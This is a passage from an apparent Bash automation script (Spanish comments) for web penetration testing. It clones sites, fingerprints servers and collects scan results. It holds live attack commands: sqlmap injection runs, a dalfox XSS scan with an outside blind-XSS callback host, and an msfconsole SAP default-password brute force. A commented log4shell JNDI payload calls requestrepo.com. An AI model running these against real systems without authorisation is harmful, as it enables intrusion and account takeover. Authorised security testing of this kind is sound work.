						break
					fi
				fi
			done
			##################################


			if [[ "$only_status_code" == "401"  || "$only_status_code" == "403"  || "$only_status_code" == "404"  ||  "$only_status_code" == *"303"* ||  "$only_status_code" == *"301"* ||  "$only_status_code" == *"302"*  ]];then
				if [ "$VERBOSE" == '1' ]; then  echo -e "\t[+] Escaneando $proto_http://$host:$port/"; fi
				webScaneado=1

				if [ -z "$FORCE" ]; then  # no es escaneo de redes por internet
					mkdir -p webClone/$host 2>/dev/null
					mkdir -p archivos/$host 2>/dev/null
				fi

				mkdir -p webTrack/$host 2>/dev/null
				touch webTrack/checksumsEscaneados.txt

				if [[ "$MODE" == "total" &&  ! -z "$URL" ]];then
					echo -e "\t[+] Clonando: $URL"

					if [[ "$ESPECIFIC" == "1" ]];then
						echo "Descargar manualmente el sitio y guardar en webTrack $host"
						read resp
					else
						# si no es CMS descargar con httrack
						egrep -i "drupal|wordpress|joomla|moodle" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt | egrep -qiv "$defaultAdminURL"
						greprc=$?
						if [[ $greprc -eq 1 ]]; then
							echo -e "\t\t[+] httrack ($host )"
							rm resultado-httrack.txt 2>/dev/null
							####### httrack ####
							#script --command "httrack $URL  --depth 1  --ext-depth 0 -O webClone/$host" -O resultado-httrack.txt
							script --command "httrack --user-agent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36' --mirror --depth=3 --max-rate=0 --sockets=unlimited --robots=0 --stay-on-same-domain '+*.html' '+*.js' '+*.json' '+*.php' '+mime:application/json' '-*.css' '-*.png' '-*.gif' '-*.jpg' '-*.jpeg' '-*.webp' '-*.tmp' '${URL}' -O 'webClone/${host}'" -O resultado-httrack.txt
							find webClone/$host | egrep '\.html|\.js' | while read line
							do
								extractLinks.py "$line" 2>/dev/null| grep "$host" | awk -F"$host/" '{print $2}' >> directorios-personalizado2.txt
							done
							####################
						fi
					fi
				fi	#total && URL

				echo -e "\t[+] Navegacion forzada en host: $proto_http://${host}:${port}${path_web}"
				checkRAM

				#remove links http/https
				removeLinks.py logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webData.txt 2>/dev/null | egrep -vi 'date|token|hidden|ajax_url|javascript' > webTrack/$host/"$proto_http"-"$host"-"$port"-"$path_web_sin_slash".html
		
				if [[ ! -f webTrack/$host/"$proto_http"-"$host"-"$port"-"$path_web_sin_slash".html ]];then
					echo "no disponible" > webTrack/$host/"$proto_http"-"$host"-"$port"-"$path_web_sin_slash".html
				fi

				noEscaneado=1
				checksumline=`md5sum webTrack/$host/"$proto_http"-"$host"-"$port"-"$path_web_sin_slash".html`
				lenghtsite=`wc -w  webTrack/$host/"$proto_http"-"$host"-"$port"-"$path_web_sin_slash".html | cut -d ' ' -f1`
				title=`cat logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt | cut -d '~' -f1`

				md5=`echo $checksumline | awk {'print $1'}`
				egrep -iq $md5 webTrack/checksumsEscaneados.txt
				md5found=$?
				
				if [ $md5found -eq 0 ]; then
					noEscaneado=0
				else
					echo $checksumline >> webTrack/checksumsEscaneados.txt
				fi

				for webserver_title in "${webservers_defaultTitles[@]}"; do
					if [[ "$title" == *"$webserver_title"* ]] || [[ "$lenghtsite" -lt 50 ]]; then
						noEscaneado=1
						break
					fi
				done

				
				#mismo host
				if [[ $md5found -eq 0 ]];then
					#echo "md5found $md5found webTrack/$host/"$proto_http"-"$host"-"$port"-"$path_web_sin_slash".html"
					echo -n "~sameHOST" >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt
					sed -i ':a;N;$!ba;s/\n//g' logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt #borrar salto de linea
				fi
			
				grep "Dominio identificado" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt
				greprc=$? 	# 1= no coincide
				result=$(formato_ip "$host")
				if [[ $result -eq 1 && $greprc -eq 0 ]] ;then
					ip2domainRedirect=1
				else
					ip2domainRedirect=0
				fi

				egrep -qi "500 Proxy Error|HTTPSredirect|400 Bad Request|Document Moved|Index of|timed out|Connection refused|Connection refused" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt #verificar si debemos escanear
				hostOK=$?

				egrep -qi "Fortinet|Cisco|RouterOS|Juniper" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt
				noFirewall=$?
				# 1= no coincide (no redirecciona a otro dominio o es error de proxy)
				if [ "$VERBOSE" == '1' ]; then  echo -e "\tnoEscaneado $noEscaneado hostOK $hostOK ip2domainRedirect $ip2domainRedirect noFirewall $noFirewall [1 1 1 0 OK]"; fi

				if [[ $hostOK -eq 1 &&  $noEscaneado -eq 1 && $noFirewall -eq 1 && $ip2domainRedirect -eq 0  ]];then  # El sitio no fue escaneado antes/no redirecciona a otro dominio.
					

					# if [ -z "$FORCE" ]; then # no es escaneo de redes por internet
					# 	####### wget ##### (usado para control si es un mismo sitio web es el mismo)
					# 	###### fuzz directorios personalizados ###
					# 	echo -e "\t\t[+] directorios personalizado"
					# 	cd webTrack/$host
					# 		wget -mirror --convert-links --adjust-extension --no-parent -U "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0" --reject gif,jpg,bmp,png,mp4,jpeg,flv,webm,mkv,ogg,gifv,avi,wmv,3gp,ttf,svg,woff2,css,ico,pdf,docx,xls,doc,ppt,pps,pptx,xlsx --exclude-directories /calendar,/noticias,/blog,/xnoticias,/article,/component,/index.php --timeout=5 --tries=1 --adjust-extension  --level=3 --no-check-certificate $proto_http://$host 2>/dev/null
					# 	cd ../../
					# 	find webTrack/$host | egrep '\.html|\.js' | while read line
					# 	do
					# 		extractLinks.py "$line" 2>/dev/null | grep "$host" | awk -F"$host/" '{print $2}' >> webTrack/directorios-personalizado2.txt
					# 	done

					# 	sed -i '/^$/d' webTrack/directorios-personalizado2.txt 2>/dev/null
					# 	sort webTrack/directorios-personalizado2.txt 2>/dev/null | egrep -v 'gif|swf|jquery|jpg' | uniq > webTrack/directorios-personalizado.txt

					# 	if [ -f webTrack/directorios-personalizado.txt ]; then
					# 		checkRAM
					# 		#web-buster -target $host -port $port -proto $proto_http -path $path_web -module custom -customDir webTrack/directorios-personalizado.txt -threads $hilos_web -redirects 0 -show404  >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"custom.txt &
					# 		cp webTrack/directorios-personalizado.txt /tmp/$host-personalizado.txt
					# 		#rm webTrack/directorios-personalizado2.txt 2>/dev/null
					# 	fi
					# fi
					# ####################################

					########### check methods ###
					waitWeb 0.3
					echo -e "\t\t[+] HTTP methods ($proto_http://$host:$port) "
					httpmethods.py -k -L -t 5 $proto_http://$host:$port > logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"httpmethods.txt  2>/dev/null &

					gourlex -t $proto_http://$host:$port -uO -s > logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"gourlex.txt
					egrep -v '\.png|\.jpg|\.js|css|facebook|nginx|failure|microsoft|github|laravel.com|laravel-news|laracasts.com|linkedin|youtube|instagram|not yet valid|cannot validate certificate|connection reset by peer|EOF|gstatic|twitter|debian|apache|ubuntu|nextcloud|sourceforge|AppServNetwork|mysql|placehold|AppServHosting|phpmyadmin|php.net|oracle.com|java.net|yiiframework|enterprisedb|googletagmanager|envoyer|bunny.net|rockylinux|no such host|gave HTTP|dcm4che|apple|google|amazon.com|turnkeylinux|.org|fb.watch|timeout|unsupported protocol|internic|redhat|fastly|juniper|SolarWinds' logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"gourlex.txt | sort | uniq > .enumeracion/"$host"_"$port"_webLinks.txt

					if [[ "$INTERNET" == "s" ]] && [[ "$MODE" == "total" ]]; then
						echo -e "\t\t[+] identificar si el host esta protegido por un WAF "
						wafw00f $proto_http://$host:$port > logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"wafw00f.txt &
					fi

					egrep -i "httpfileserver" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt | egrep -qiv "$defaultAdminURL" # solo el segundo egrep poner "-q"
					greprc=$?
					if [[ $greprc -eq 0  ]];then #
						echo "httpfileserver Vulnerable: https://github.com/Muhammd/ProFTPD-1.3.3a " >> .vulnerabilidades/"$host"_"$port"_ProFTPD-RCE.txt
					fi

					enumeracionCMS "$proto_http" $host $port


					if [ $proto_http == "https" ]; then
						testSSL "$proto_http" $host $port
					fi


					
					###  CMS admin ######
					egrep -qiv 'drupal|joomla|wordpress' logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt | egrep -qiv "302 Found|Always200-OK|swfobject|BladeSystem|botpress|Plesk|FortiMail|StreamHub|404 not found|broadband device|Check Point|cisco|Chamilo|Cloudflare|controlpanel|Diagnostic Interface|cpanel|erpnext|Fortinet|Dahua|MailCleaner|GitLab|Liferay|GoAhead-Webs|Grafana|hikvision|Huawei|Juniper|keycloak|Mini web server|networkMonitoring|Nextcloud|NTLM|Office|oviyam|openresty|Open Source Routing Machine|oracle|ownCloud|Payara|pfsense|printer|processmaker|Roundcube|Router|RouterOS|SoftEther|SonicWALL|FortiGate|airOS|Strapi|Slim|Sophos|Taiga|TOTVS|tp-link|TrueConf Server Guest Page|Tyco|User Portal|Viridian|webmail|whm|xxxxxx|Zentyal|OLT Web Management Interface|Zimbra|Outlook|owa"
					greprc=$?
					if [[ $greprc -eq 0  ]];then 
						checkRAM
						enumeracionAdminCMS "$proto_http" "$host" "$port" "$msg_error_404"
					fi
					####################################

					##check banner ##
					egrep -i 'Apache/2.4.49|Apache/2.4.50' logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt 
					greprc=$?
					if [[ $greprc -eq 0  ]];then
						echo "version Apache/2.4.49 vulnerable" >> .vulnerabilidades/"$host"_"$port"_apache-CVE~2021~41773.txt 
					fi

					###  if the server is apache ######
					egrep -i 'apache|nginx|kong' logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt | egrep -qiv "$defaultAdminURL" # solo el segundo egrep poner "-q"
					greprc=$?
					if [[ $greprc -eq 0  ]];then # si el banner es Apache y no se enumero antes
						checkRAM
						enumeracionApache "$proto_http" "$host" "$port" "$msg_error_404"
					fi
					####################################

					###  if the server is java ######
					egrep -i 'JavaServer' logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt | egrep -qiv "$defaultAdminURL" # solo el segundo egrep poner "-q"
					greprc=$?
					if [[ $greprc -eq 0  ]];then # si el banner es Apache y no se enumero antes
						checkRAM
						enumeracionJava "$proto_http" "$host" "$port" "$msg_error_404"
					fi
					####################################


					

					###  if the server is nginx ######
					egrep -i 'nginx|api-endpoint|Express' logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt | egrep -qiv "$defaultAdminURL" 
					greprc=$?
					if [[ $greprc -eq 0  ]];then # si el banner es nginx y no se enumero antes
						checkRAM
						enumeracionApi "$proto_http" "$host" "$port" "$msg_error_404"
					fi
					

					#######  if the server is SharePoint ######
					grep -i SharePoint logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt | egrep -qiv "$defaultAdminURL"  # no redirecciona
					greprc=$?
					if [[ $greprc -eq 0  ]];then # si el banner es SharePoint
						checkRAM
						enumeracionSharePoint "$proto_http" "$host" "$port" "$msg_error_404"
					fi
					####################################

					#######  if the server is IIS ######
					grep -i IIS logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt | egrep -qiv "$defaultAdminURL"  # no redirecciona
					greprc=$?
					if [[ $greprc -eq 0  ]];then # si el banner es IIS y no se enumero antes
						checkRAM
						enumeracionIIS "$proto_http" "$host" "$port" "$msg_error_404"
					fi
					####################################
					
					#######  if the server is tomcat ######
					egrep -i "GlassFish|Coyote|Tomcat|Resin|JBoss|WildFly|Payara" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt| egrep -qiv "302 Found"
					greprc=$?
					if [[ $greprc -eq 0  ]];then # si el banner es Java y no se enumero antes
						checkRAM
						enumeracionTomcat "$proto_http" "$host" "$port" "$msg_error_404"
						#  ${jndi:ldap://z4byndtm.requestrepo.com/z4byndtm}   #log4shell
					fi
					####################################

					#######  if the server is SAP ######
					egrep -i "SAP NetWeaver" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt | egrep -qiv "302 Found"
					greprc=$?
					if [[ $greprc -eq 0  ]];then # si el banner es Java y no se enumero antes
						checkRAM
						enumeracionSAP "$proto_http" $host $port
						echo -e "\t\t[+] http-sap-netweaver-leak"
						$proxychains nmap -n -Pn -sT -p $port --script http-sap-netweaver-leak  $host > logs/vulnerabilidades/"$host"_"$port"_sapNetweaverLeak.txt

						echo -e "\t\t[+] Test default passwords"
						$proxychains msfconsole -x "use auxiliary/scanner/sap/sap_soap_rfc_brute_login;set RHOSTS $host;set RPORT $port;exploit;exit" > logs/vulnerabilidades/"$host"_"$port"_passwordDefecto.txt 2>/dev/null &
						#auxiliary/scanner/sap/sap_soap_rfc_read_table
						#set FIELDS MANDT, BNAME, UFLAG, BCODE, PASSCODE, PWDSALTEDHASH
					fi
					####################################


					# if not technology not reconigzed
					egrep -qi "unsafe legacy renegotiation disabled" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt  2>/dev/null
					greprc=$?
					if [[ $greprc -eq 0 ]] ; then
						cp .enumeracion/"$host"_80_webData.txt logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt
					fi

					serverType=`cat logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt | cut -d "~" -f2`
					echo -e "\t\t[+] serverType $serverType"
					if [[ -z "$serverType"  ]]; then
						checkRAM
						enumeracionDefecto "$proto_http" "$host" $port "$msg_error_404"
					fi

					#######  if the server is IoT ######
					enumeracionIOT	$proto_http $host $port

					#echo -e "\t\t[+] cloneSite ($proto_http $host $port) PROXYCHAINS $PROXYCHAINS MODE $MODE"
					######### clone #####
					# if [[ "$PROXYCHAINS" == "n" ]] && [[ "$MODE" == "total" ]]; then
					# 	cloneSite $proto_http $host $port
					# fi
					####################################

					if [[ "$MODE" == "total" ]]; then
						#source resource integrity
						#echo -e "\t[+] source resource integrity check ($proto_http://$host:$port) "
						#sri-check $proto_http://$host:$port  > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"sri.txt 2>/dev/null
						#grep -i '<script' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"sri.txt >> .vulnerabilidades/"$host"_"$port"_sri.txt 2>/dev/null

						# _blank targets with no "rel nofollow no referrer"
						#echo -e "\t[+] _blank targets check ($proto_http://$host:$port)  "
						#check_blank_target $proto_http://$host:$port > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"check-blank-target.txt
						#grep -iv error logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"check-blank-target.txt >> .vulnerabilidades/"$host"_"$port"_check-blank-target.txt
						checkRAM
						egrep -i "drupal|wordpress|joomla|moodle" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt | egrep -qiv "$defaultAdminURL"
						greprc=$?
						if [[  "$EXTRATEST" == "oscp" && $greprc -eq 1 && "$ESPECIFIC" == "1" ]]; then
							##########################################
							checkRAM
							echo -e "\t[+] Crawling ($proto_http://$host:$port )"
							echo -e "\t\t[+] katana"
							katana -u $proto_http://$host:$port -no-scope -no-color -silent -output logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webCrawledKatana.txt >/dev/null 2>/dev/null
							echo -e "\t\t[+] blackwidow"

							blackwidow -u $proto_http://$host:$port > logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webCrawledBlackwidow.txt
							head -30 logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webCrawledBlackwidow.txt > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CS-01.txt
							grep 'Telephone' logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webCrawledBlackwidow.txt | sort | uniq > .enumeracion/"$host"_"$port"_telephones.txt
							grep -i 'sub-domain' logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webCrawledBlackwidow.txt | sort | uniq | awk {'print $4'} | httprobe.py > .enumeracion/"$host"_web_app2.txt
							cat .enumeracion/"$host"_web_app2.txt servicios/webApp.txt 2>/dev/null | delete-duplicate-urls.py  > servicios/webApp2.txt
							mv servicios/webApp2.txt servicios/webApp.txt 2>/dev/null

							sort logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webCrawledKatana.txt |  sed -r "s/\x1B\[(([0-9]+)(;[0-9]+)*)?[m,K,H,f,J]//g"  | uniq > logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webCrawled.txt
							grep Dynamic logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webCrawledBlackwidow.txt |  sed -r "s/\x1B\[(([0-9]+)(;[0-9]+)*)?[m,K,H,f,J]//g" | awk {'print $5'} | uniq > logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webCrawled.txt
							grep -v Dynamic logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webCrawledBlackwidow.txt |  sed -r "s/\x1B\[(([0-9]+)(;[0-9]+)*)?[m,K,H,f,J]//g" | uniq >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webCrawled.txt

							grep $DOMINIO logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webCrawled.txt | egrep -v 'google|youtube' | sort | uniq > .enumeracion/"$host"_"$port"_webCrawled.txt
							grep -iv $DOMINIO logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webCrawled.txt | egrep -v 'google|youtube' | sort | uniq  > .enumeracion/"$host"_"$port"_websRelated.txt
							echo ""

							grep --color=never "\?" .enumeracion/*_webCrawled.txt | sort | uniq >> logs/enumeracion/parametrosGET2.txt
							grep "$host" logs/enumeracion/parametrosGET2.txt | egrep -iv '\.css|\.js|\.eot|\.svg|\.ttf|\.woff2' |sort | uniq | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g"  >> logs/enumeracion/"$host"_parametrosGET_uniq.txt


							##### Eliminar URL repetidas que solo varian en los parametros
							current_uri=""
							while IFS= read -r url
							do
								uri=`echo $url | cut -f1 -d"?"`
								param=`echo $line | cut -f2 -d"?"`

								if [ "$current_uri" != "$uri" ];
								then
									echo  "$url" >> logs/enumeracion/"$host"_parametrosGET_uniq_final.txt
									current_uri=$uri
								fi
							done < logs/enumeracion/"$host"_parametrosGET_uniq.txt

							########### XSS / SQLi ####
							i=1
							for url in `cat logs/enumeracion/"$host"_parametrosGET_uniq_final.txt 2>/dev/null`; do
								echo -e "$OKBLUE+ -- --=############ Revisando $url (SQLi/XSS) #########$RESET"

								echo -e "$OKBLUE+ -- --=############ Probando SQL inyection. #########$RESET"
								echo  "$url" | tee -a logs/vulnerabilidades/"$host"_"web$i"_sqlmap.txt
								sqlmap -u "$url" --batch --tamper=space2comment --threads 5 | tee -a logs/vulnerabilidades/"$host"_"web$i"_sqlmap.txt
								sqlmap -u "$url" --batch  --technique=B --risk=3  --threads 5 | tee -a logs/vulnerabilidades/"$host"_"web$i"_sqlmapBlind.txt

								#  Buscar SQLi
								egrep -iq "is vulnerable" logs/vulnerabilidades/"$host"_"web$i"_sqlmap.txt
								greprc=$?
								if [[ $greprc -eq 0 ]] ; then
									echo -e "\t$OKRED[!] Inyeccion SQL detectada \n $RESET"
									echo "sqlmap -u \"$url\" --batch " >> .vulnerabilidades/"$host"_"web$i"_sqlmap.txt

									# CS-58 Inyecciones SQL
									cat .vulnerabilidades/"$host"_"web$i"_sqlmap.txt >> .vulnerabilidades/"$host"_"$port"_CS-58.txt
									cat .vulnerabilidades/"$host"_"$port"_CS-58.txt >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CS-58.txt
								fi

								#  Buscar SQLi blind
								egrep -iq "is vulnerable" logs/vulnerabilidades/"$host"_"web$i"_sqlmapBlind.txt
								greprc=$?
								if [[ $greprc -eq 0 ]] ; then
									echo -e "\t$OKRED[!] Inyeccion SQL detectada \n $RESET"
									echo "sqlmap -u \"$url\" --batch  --technique=B --risk=3" >> .vulnerabilidades/"$host"_"web$i"_sqlmapBlind.txt

									# CS-58 Inyecciones SQL
									cat .vulnerabilidades/"$host"_"web$i"_sqlmapBlind.txt >> .vulnerabilidades/"$host"_"$port"_CS-58.txt
									cat .vulnerabilidades/"$host"_"$port"_CS-58.txt >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CS-58.txt
								fi

								#  Buscar XSS
								dalfox -b hahwul.xss.ht url $url | tee -a logs/vulnerabilidades/"$host"_"web$i"_xss.txt
								#https://z0id.xss.ht/


								egrep -iq "Triggered XSS Payload" logs/vulnerabilidades/"$host"_"web$i"_xss.txt
								greprc=$?
								if [[ $greprc -eq 0 ]] ; then
									echo -e "\t$OKRED[!] XSS detectada \n $RESET"
									echo "url $url" >  .vulnerabilidades/"$host"_"web$i"_xss.txt
									egrep -ia "Triggered XSS Payload" logs/vulnerabilidades/"$host"_"web$i"_xss.txt >> .vulnerabilidades/"$host"_"web$i"_xss.txt
									# CS-59 XSS
									cat .vulnerabilidades/"$host"_"web$i"_xss.txt >> .vulnerabilidades/"$host"_"$port"_CS-59.txt
									cat .vulnerabilidades/"$host"_"$port"_CS-59.txt > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CS-59.txt
								fi

								i=$(( i + 1 ))

							done # xss
							#####################
						fi #oscp
					fi #total

					echo -e "\n"
					######
				else
					echo -e "\t\t[+] Redirección, error de proxy detectado o sitio ya escaneado \n"
				fi

			else
				if [ "$VERBOSE" == '1' ]; then  echo -e "NO escanear $proto_http://$host:$port $path_web"; fi
			fi #hosting
#######3
		fi


	done # subdominios
done #for navegacino forzada

waitFinish

if [ "$VERBOSE" == '1' ]; then  echo " IP_LIST_FILE $IP_LIST_FILE"; fi


####### PARSE ########
echo "webScaneado $webScaneado"
if [[ $webScaneado -eq 1 ]]; then
	for line in $(cat $TARGETS); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		proto_http=`echo $line | cut -f3 -d":"`
		if [ -z $DOMINIO ] ; then
			lista_hosts=`grep --color=never $ip $IP_LIST_FILE  | egrep 'DOMINIO|subdomain|vhost'| cut -d "," -f2`
			if [ -z "$lista_hosts" ] ; then
					lista_hosts=$ip
			else
					lista_hosts=`echo -e "$lista_hosts\n$ip"|uniq`
			fi
		else
			lista_hosts=$ip
		fi

		#######si la ip resuelve a un dominio
		newhost=$(cat "logs/enumeracion/${ip}_web_domainWebData.txt" 2>/dev/null)
		if [[ -n "$newhost" ]]; then
			lista_hosts="${lista_hosts}"$'\n'"${newhost}"
		fi
		##########################

		for host in $lista_hosts; do
			echo -e "Parse $host:$port"

			[ ! -e ".enumeracion2/${host}_${port}_webadmin.txt" ] && egrep --color=never "^200" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webadmin.txt > .enumeracion/"$host"_"$port"_webadmin.txt 2>/dev/null
			#check if the response is 401 for all request
			if [ -f "logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webadmin.txt" ]; then
				count=$(grep -c "401" "logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webadmin.txt")
				if [ "$count" -gt 100 ]; then
					echo "$proto_http"://"$host":"$port""$path_web" > .enumeracion/"$host"_"$port"_webadmin.txt
				fi
			fi

			#wordpress plugins
			[ ! -e ".vulnerabilidades2/${host}_${port}_wordpressPlugins.txt" ] && grep -i 'vulnerable' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"wordpressPlugins.txt >> .vulnerabilidades/"$host"_"$port"_wordpressPlugins.txt 2>/dev/null
			line_count=$(wc -l < .vulnerabilidades/"$host"_"$port"_wordpressPlugins.txt)
			# Check if the number of lines is greater than 25 // false positve
			if [ "$line_count" -gt 25 ]; then
				# Clear the content of the file
				grep -i ' 200 ' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"wordpressPlugins.txt >> .vulnerabilidades/"$host"_"$port"_wordpressPlugins.txt
			fi
			######

			[ ! -e ".enumeracion2/${host}_${port}_joomla-version.txt" ] && cp logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"joomla-version.txt .enumeracion/"$host"_"$port"_joomla-version.txt 2>/dev/null
			[ ! -e ".enumeracion2/${host}_${port}_zabbix-version.txt" ] && cp logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"zabbix-version.txt .enumeracion/"$host"_"$port"_zabbix-version.txt 2>/dev/null

			[ ! -e ".enumeracion2/${host}_${port}_SharePoint.txt" ] && egrep --color=never "^200" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"SharePoint.txt >> .enumeracion/"$host"_"$port"_SharePoint.txt 2>/dev/null
			[ ! -e ".enumeracion2/${host}_${port}_webdirectorios.txt" ] && egrep --color=never "^200" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios.txt > .enumeracion/"$host"_"$port"_webdirectorios.txt 2>/dev/null
			[ ! -e ".enumeracion2/${host}_${port}_archivosSAP.txt" ] && egrep --color=never "^200" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"archivosSAP.txt > .enumeracion/"$host"_"$port"_archivosSAP.txt 2>/dev/null
			[ ! -e ".enumeracion2/${host}_${port}_custom.txt" ] && egrep --color=never "^200|^500" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"custom.txt > .enumeracion/"$host"_"$port"_custom.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}_webarchivos.txt" ] && egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"webarchivos.txt >> .vulnerabilidades/"$host"_"$port"_webarchivos.txt 2>/dev/null
			[ ! -e ".enumeracion2/${host}_${port}_webarchivos.txt" ] && egrep --color=never "^200" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webserver.txt >> .enumeracion/"$host"_"$port"_webarchivos.txt 2>/dev/null
			[ ! -e ".enumeracion2/${host}_${port}_webarchivos.txt" ] && egrep --color=never "^200" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"api.txt >> .enumeracion/"$host"_"$port"_webarchivos.txt 2>/dev/null
			[ ! -e ".enumeracion2/${host}_${port}_webarchivos.txt" ] && egrep --color=never "^200" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"php-files.txt >> .enumeracion/"$host"_"$port"_webarchivos.txt 2>/dev/null
			[ ! -e ".enumeracion2/${host}_${port}_webarchivos.txt" ] && egrep --color=never "^200" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"archivosTomcat.txt >> .enumeracion/"$host"_"$port"_webarchivos.txt 2>/dev/null
			[ ! -e ".enumeracion2/${host}_${port}_webarchivos.txt" ] && egrep --color=never "^200" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"asp-files.txt >> .enumeracion/"$host"_"$port"_webarchivos.txt 2>/dev/null
			[ ! -e ".enumeracion2/${host}_${port}_webarchivos.txt" ] && egrep --color=never "^200" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"jsp-files.txt >> .enumeracion/"$host"_"$port"_webarchivos.txt 2>/dev/null
			[ ! -e ".enumeracion2/${host}_${port}_cert.txt" ] && grep commonName logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"cert.txt > .enumeracion/"$host"_"$port"_cert.txt 2> /dev/null
			[ ! -e ".enumeracion2/${host}_${port}_shortname.txt" ] && egrep '\[+\]' logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"shortname.txt 2>/dev/null |  sed -r "s/\x1B\[(([0-9]+)(;[0-9]+)*)?[m,K,H,f,J]//g" >> .enumeracion/"$host"_"$port"_shortname.txt
			[ ! -e ".enumeracion2/${host}_${port}_archivosCGI.txt" ] && egrep --color=never "^200" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"archivosCGI.txt > .enumeracion/"$host"_"$port"_archivosCGI.txt 2>/dev/null
			[ ! -e ".enumeracion2/${host}_${port}_certsrv.txt" ] && grep --color=never "401" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"certsrv.txt > .enumeracion/"$host"_"$port"_certsrv.txt 2>/dev/null
			[ ! -e ".enumeracion2/${host}_${port}_hadoopNamenode.txt" ] && grep --color=never "|" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"hadoopNamenode.txt 2>/dev/null | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE|NT_STATUS_UNKNOWN|http-server-header|did not respond with any data|http-server-header" > .enumeracion/"$host"_"$port"_hadoopNamenode.txt
			[ ! -e ".enumeracion2/"$host"_"$port"_webData.txt" ] && grep -v 'Error1 Get' logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt > .enumeracion/"$host"_"$port"_webData.txt 2>/dev/null
			[ ! -e ".enumeracion2/${host}_${port}_droopescan.txt" ] && cat logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"droopescan.txt > .enumeracion/"$host"_"$port"_droopescan.txt 2>/dev/null
